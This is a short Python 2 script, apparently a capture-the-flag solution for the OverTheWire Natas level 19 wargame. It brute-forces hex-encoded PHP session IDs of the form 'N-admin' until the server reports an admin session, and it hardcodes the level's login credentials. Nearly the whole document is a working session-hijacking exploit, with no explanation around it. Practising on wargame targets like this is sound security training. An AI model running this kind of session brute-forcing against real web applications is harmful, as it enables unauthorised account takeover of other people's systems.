#!/usr/bin/env python

# Chris Lapa
# https://github.com/GusBricker/ctf
# GNU General Public License v2.0

import requests
import time

session = requests.Session()
session.auth = ("natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

START_SESSID=0
END_SESSID=640
password=""
for i in range(START_SESSID, END_SESSID, 1):
    sessid = "{0}-admin".format(i)
    sessid = "".join("{:02x}".format(ord(c)) for c in sessid)
    cookie = {"PHPSESSID": str(sessid)}
    print "Trying Session ID: {0}".format(i),
    url="""http://natas19.natas.labs.overthewire.org/index.php"""
    r = session.post(url, cookies=cookie, data={"username":"bob", "password": "bob"})
    print " | " + str(cookie)

    if "You are an admin" in r.text:
        print "Found admin session!"
        print r.text
        break
